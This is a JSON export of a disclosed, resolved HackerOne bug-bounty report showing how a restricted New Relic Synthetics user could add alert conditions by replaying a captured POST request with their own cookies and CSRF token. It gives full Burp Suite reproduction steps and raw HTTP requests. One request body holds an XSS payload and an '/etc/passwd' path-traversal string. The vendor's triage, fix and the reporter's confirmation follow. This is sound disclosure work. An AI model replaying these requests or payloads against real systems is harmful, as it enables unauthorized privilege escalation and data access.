{"id":334143,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMzQxNDM=","url":"https://hackerone.com/reports/334143","title":"[NR Synthetics] Restricted User can add/modify alert conditions on monitors without any synthetics privileges ","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2018-04-06T04:22:26.951Z","submitted_at":"2018-04-06T04:22:26.951Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jon_bottarini","url":"/jon_bottarini","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/013/784/e3a368de321ded9a9b2118272e89bffd355380e5_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":17011,"url":"https://hackerone.com/newrelic","handle":"newrelic","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"New Relic","twitter_handle":"newrelic","website":"https://newrelic.com","about":"New Relic's Coordinated Disclosure Program"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-09-04T10:54:23.028Z","bug_reporter_agreed_on_going_public_at":"2020-08-20T02:48:40.675Z","team_member_agreed_on_going_public_at":"2020-09-04T10:54:22.939Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"There is a privilege escalation bug that allows a user with restricted privileges to make changes to alerts on Synthetics monitors, without the proper permissions to do so (in fact, they can make changes with NO synthetics permissions). In order to reproduce this it's easiest if you have two accounts (an admin user and the restricted user). \n\n## Steps to Reproduce:\n\n1. Login as an admin and navigate to Synthetics. Make sure that Synthetics privileges are turned ON and the Restricted User is not given any privileges. \n2. Create a new monitor \n3. Navigate to the alert settings for the monitor (https://synthetics.newrelic.com/accounts/1523936/monitors/99657e19-ace3-483d-a5d4-d199f09e177b/conditions)\n4. Click on the \"Add alert condition\" button \n5. Choose any alert condition and turn intercept on in Burp Suite before you click \"Save\". \n\nThere will be a POST request that looks like this:\n\n```\nPOST /accounts/1523936/alerts/99657e19-ace3-483d-a5d4-d199f09e177b/conditions.json HTTP/1.1\nHost: synthetics.newrelic.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://synthetics.newrelic.com/accounts/1523936/monitors/99657e19-ace3-483d-a5d4-d199f09e177b/conditions\nContent-Type: application/json;charset=utf-8\nX-XSRF-TOKEN: 6Zp788coFKDDHdLNQiLvkWAeggcPki84R8PPyv88ywxnaHVMZg6oXPusDMg2kA6K\nContent-Length: 265\nCookie: admincookies\nConnection: close\n\n{\"id\":189244,\"accountId\":1523936,\"name\":\"\\\"\u003e\u003cimg src=x onerror=alert(1)\u003e\",\"enabled\":true,\"isDefaultPolicy\":false,\"accountPolicyId\":110103,\"description\":\"'Check Failure' - /../../../../../../../../../../../../../../../etc/passwd%00 and 1 other notification channel\"}\n```\n\n**Do not** forward this request. Send this request to repeater, then DROP the request so that it does not complete. \n\n\n6. Now, from a restricted user account, login and navigate to Synthetics, the page should look like this:\n\n{F282466}\n\nNotice, no Synthetics permissions. \n\n7. From the Restricted account, reload the Synthetics page and make sure that your Burp intercept proxy is on. \n8. The request will be captured and look something like this:\n\n```\nGET /accounts/1523936/plan.json HTTP/1.1\nHost: synthetics.newrelic.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://synthetics.newrelic.com/accounts/1523936/monitors\nX-XSRF-TOKEN: uNzCKU1fgpc0eczC5VfAsBWQ5DtsVSuZKkvS3U3M0HQ5BY4SHn8LBaSKg10CYQla\nCookie: restrictedcookies\nDNT: 1\nConnection: close\n```\n\nNow, change the request so that it looks like this:\n\n```\nPOST /accounts/1523936/alerts/99657e19-ace3-483d-a5d4-d199f09e177b/conditions.json HTTP/1.1\nHost: synthetics.newrelic.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/json;charset=utf-8\nReferer: https://synthetics.newrelic.com/accounts/1523936/sla-report\nX-XSRF-TOKEN: uNzCKU1fgpc0eczC5VfAsBWQ5DtsVSuZKkvS3U3M0HQ5BY4SHn8LBaSKg10CYQla\nCookie: restrictedusercookies\nDNT: 1\nConnection: close\nContent-Length: 190\n\n{\"id\":181171,\"accountId\":1523936,\"name\":\"123987\",\"enabled\":true,\"isDefaultPolicy\":false,\"accountPolicyId\":102030,\"description\":\"'Check Failure' - ██████ notification channel\"}\n```\n\n**Notice:**\n\n- We are using the Restricted User's CSRF token\n- We are using the restricted users cookies to perform the request\n\nAll we have really changed here is that we've changed the `GET /accounts/1523936/monitors HTTP/1.1` request to `POST /accounts/1523936/alerts/99657e19-ace3-483d-a5d4-d199f09e177b/conditions.json HTTP/1.1`, we added the `Content-Type: application/json;charset=utf-8` header, and we added the request itself:\n\n`{\"id\":181171,\"accountId\":1523936,\"name\":\"123987\",\"enabled\":true,\"isDefaultPolicy\":false,\"accountPolicyId\":102030,\"description\":\"'Check Failure' - ██████████ notification channel\"}`\n\nIf you get this response:\n\n`{\"code\":415,\"message\":\"HTTP 415 Unsupported Media Type\"}`\n\nIt means you forgot to include the `Content-Type: application/json;charset=utf-8` header in your request. \n\nA successful privilege escalation (if you've done the steps above correctly) will look like this: \n{F282468}\n\nGo back to the conditions from the Admin account, and you'll notice that the new alert condition has been added.\n\n## Impact\n\nPrivilege escalation  - restricted user to privileged user/admin within Synthetics","bounty_amount":"750.0","formatted_bounty":"$750","weakness":{"id":75,"name":"Privilege Escalation"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":282466,"file_name":"Screen_Shot_2018-04-05_at_8.20.21_PM.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/282/466/8c96bcff2dab2b59685731e85908b27d86a8f6af/Screen_Shot_2018-04-05_at_8.20.21_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-04-05_at_8.20.21_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-04-05_at_8.20.21_PM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZV3IBMDT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T144715Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIHx%2BIgfH0%2FRLQqbPD5vv6PNps92HY0yneL0kxkNwZHOyAiALrXRJqTvQQGm0xEkYGCB0kbPjUCCkzSeRztvcuetAYyqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIM5FTPTB1nK4gXIBLuKtcDHmLbKhsWpyXKgWy1fAYOf0DZEqCEqF9ns7RwihS1bFM9%2BSDXYY0CmIqutWQhK5asoL8jbJZ39%2FJ2eai2SoxTlg3PhjMpNNSUfPFgauwX6vt%2FoeK9VnB1Hmqg6bCNA62qIJPnlTONluGngv604Y6CnYL9Se%2B%2BjgOpqhqmIOX9KlzGAoRM0Ci%2BrWGdELH8Q66bSHmapdLHPWMoGBEj%2BeruK3oCs%2BDaUQ1aE%2FEQ8R5PgqLM3Pq6DrZV9PlFixmkikk8SpDcsFEiT0Zw0gsy2qPz3z3BHAEuG64GguAhIs5FvYP7HbdpPv7rQz4QSDXgN3SIbVD0A4kcV1iNQpZyiw2rmdxuUWIk46d%2FT0u%2B7j9yAdfpDuPVKPDHJD35k0pB6VLe7RtlSwwvcDUa7LL6FJxvOPpupIMPSy51BJl9%2Bf8022a6pcy263zeRDGJjALAc6brW%2BvQoDUu%2FQP%2BdxwOLZvXCyyGJp2%2BK86jg8qU%2FLWZ4DVeR3bIO1n7Fw%2B53iFlBIMatC3ZSLlV1J7dSDCk74u6OWvql%2Brvb6q%2Bj8NHQK6luFckQV%2B9okMhTYuNniW3sHS8rjyNrrGhP8vMtxMzink9EL%2FmU0Oxusg2wmaXCDfIKpDDmspvZQv8MJ%2F%2FkIsGOqYBaz2hfRV48KDU0Mx0UomuXdEWK6oszm51EnI%2FeSepVmINgIWWggB7gENawN0rgfpMSIqQjB%2BpErtoDw1jNWaknZlAG9GLkCZ49lNHNirjr7iPk7LouunUzSZjaag8Yc19L8BAWjyLZnHXpqUZQRBSoqOcAoct3F46M7AzK2ewXHmh7aKY3cfAQTu9yVTJd2CDpuLtlyUDUa37BJ8%2F84puzgJS34jmeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=05142b0bf92be1e489f8648ffa36fe0f9d4cc7e54b11ff5a024ad2639866eb03","file_size":336819,"type":"image/png"},{"id":282468,"file_name":"Screen_Shot_2018-04-05_at_9.10.59_PM.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/282/468/121fcf3e3a1106415334e43b4b0013d3c277ed7d/Screen_Shot_2018-04-05_at_9.10.59_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-04-05_at_9.10.59_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-04-05_at_9.10.59_PM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZV3IBMDT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T144715Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIHx%2BIgfH0%2FRLQqbPD5vv6PNps92HY0yneL0kxkNwZHOyAiALrXRJqTvQQGm0xEkYGCB0kbPjUCCkzSeRztvcuetAYyqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIM5FTPTB1nK4gXIBLuKtcDHmLbKhsWpyXKgWy1fAYOf0DZEqCEqF9ns7RwihS1bFM9%2BSDXYY0CmIqutWQhK5asoL8jbJZ39%2FJ2eai2SoxTlg3PhjMpNNSUfPFgauwX6vt%2FoeK9VnB1Hmqg6bCNA62qIJPnlTONluGngv604Y6CnYL9Se%2B%2BjgOpqhqmIOX9KlzGAoRM0Ci%2BrWGdELH8Q66bSHmapdLHPWMoGBEj%2BeruK3oCs%2BDaUQ1aE%2FEQ8R5PgqLM3Pq6DrZV9PlFixmkikk8SpDcsFEiT0Zw0gsy2qPz3z3BHAEuG64GguAhIs5FvYP7HbdpPv7rQz4QSDXgN3SIbVD0A4kcV1iNQpZyiw2rmdxuUWIk46d%2FT0u%2B7j9yAdfpDuPVKPDHJD35k0pB6VLe7RtlSwwvcDUa7LL6FJxvOPpupIMPSy51BJl9%2Bf8022a6pcy263zeRDGJjALAc6brW%2BvQoDUu%2FQP%2BdxwOLZvXCyyGJp2%2BK86jg8qU%2FLWZ4DVeR3bIO1n7Fw%2B53iFlBIMatC3ZSLlV1J7dSDCk74u6OWvql%2Brvb6q%2Bj8NHQK6luFckQV%2B9okMhTYuNniW3sHS8rjyNrrGhP8vMtxMzink9EL%2FmU0Oxusg2wmaXCDfIKpDDmspvZQv8MJ%2F%2FkIsGOqYBaz2hfRV48KDU0Mx0UomuXdEWK6oszm51EnI%2FeSepVmINgIWWggB7gENawN0rgfpMSIqQjB%2BpErtoDw1jNWaknZlAG9GLkCZ49lNHNirjr7iPk7LouunUzSZjaag8Yc19L8BAWjyLZnHXpqUZQRBSoqOcAoct3F46M7AzK2ewXHmh7aKY3cfAQTu9yVTJd2CDpuLtlyUDUa37BJ8%2F84puzgJS34jmeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=29295ec2fd34d5ff2c7d3aabe4ffb3a3c13519252ab0567bd89570390c542786","file_size":394297,"type":"image/png"}],"allow_singular_disclosure_at":"2020-09-19T02:48:40.744Z","allow_singular_disclosure_after":-33479915.089910664,"singular_disclosure_allowed":true,"vote_count":15,"voters":["wi11","ali","jgu","pahadi","eveeez","an0nym0us","hotmuffin","prateek_thakare","cryptographer","aps08","and 5 more..."],"severity":{"rating":"medium","author_type":"User"},"structured_scope":{"databaseId":4411,"asset_type":"URL","asset_identifier":"synthetics.newrelic.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":2575050,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @jon_bottarini,\n\nThank you for your report!\n\nWe've forwarded this on to the appropriate engineering team, and we'll be evaluating this issue to see how it relates with earlier permissions issue reports. We'll update this report as soon as we've finished our investigation with the engineering team.","automated_response":false,"created_at":"2018-04-06T23:40:29.987Z","updated_at":"2018-04-06T23:40:29.987Z","actor":{"username":"dmcmahon","cleared":false,"url":"/dmcmahon","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2575052,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @jon_bottarini,\n\nWe've determined that this report is eligible for a bounty.\n\nThank you for your report!","automated_response":false,"created_at":"2018-04-06T23:41:03.653Z","updated_at":"2018-04-06T23:41:03.653Z","actor":{"url":"/newrelic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"New Relic"}},"bounty_amount":"750.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"newrelic","collaborator":{"username":"jon_bottarini","url":"/jon_bottarini"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2976405,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hi @jon_bottarini,\n\nOur engineering team has reported that this issue is resolved.\n\nCan you verify that you're not longer able to reproduce this issue?","automated_response":false,"created_at":"2018-07-02T21:26:32.992Z","updated_at":"2018-07-02T21:26:32.992Z","actor":{"username":"dmcmahon","cleared":false,"url":"/dmcmahon","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3027339,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi @dmcmahon - This looks good to me. I get this error:\n\n`{\"code\":403,\"message\":\"HTTP 403 Forbidden\"}`","automated_response":false,"created_at":"2018-07-11T00:38:01.427Z","updated_at":"2018-07-11T00:38:01.427Z","actor":{"username":"jon_bottarini","cleared":true,"url":"/jon_bottarini","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/784/e3a368de321ded9a9b2118272e89bffd355380e5_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3041813,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @jon_bottarini,\n\nThank you for confirming that this issue has been properly resolved!","automated_response":false,"created_at":"2018-07-13T18:23:13.698Z","updated_at":"2018-07-13T18:23:13.698Z","actor":{"username":"dmcmahon","cleared":false,"url":"/dmcmahon","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"jon_bottarini","url":"/jon_bottarini"},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8984358,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Could you redact `██████████`? Thanks! ","automated_response":false,"created_at":"2020-08-20T02:48:40.704Z","updated_at":"2020-09-04T10:53:43.364Z","first_to_agree":true,"actor":{"username":"jon_bottarini","cleared":true,"url":"/jon_bottarini","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/784/e3a368de321ded9a9b2118272e89bffd355380e5_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9127915,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-09-04T10:54:22.960Z","updated_at":"2020-09-04T10:54:22.960Z","actor":{"username":"dmcmahon","cleared":false,"url":"/dmcmahon","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9127916,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-09-04T10:54:23.054Z","updated_at":"2020-09-04T10:54:23.054Z","actor":{"username":"dmcmahon","cleared":false,"url":"/dmcmahon","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}